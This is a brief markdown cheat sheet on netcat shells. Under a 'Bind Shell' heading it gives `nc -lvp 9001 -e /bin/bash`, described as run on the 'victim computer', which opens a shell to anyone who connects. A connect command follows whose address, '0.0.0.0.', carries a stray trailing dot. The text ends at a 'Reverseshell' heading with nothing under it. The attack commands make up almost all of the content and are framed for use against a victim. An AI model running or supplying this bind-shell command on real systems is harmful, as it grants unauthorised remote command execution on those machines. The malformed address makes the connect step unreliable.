
#### This is how to setup a bind/reverse shell listener  

## Bind Shell
*set's up listener on victim*

**Listener:**  
`nc -lvp 9001 -e /bin/bash`
* The above command will setup a listener on victim computer

**how to connect to lisenter**  
`nc 0.0.0.0. 9001`


## Reverseshell
_set's up listener on attacker_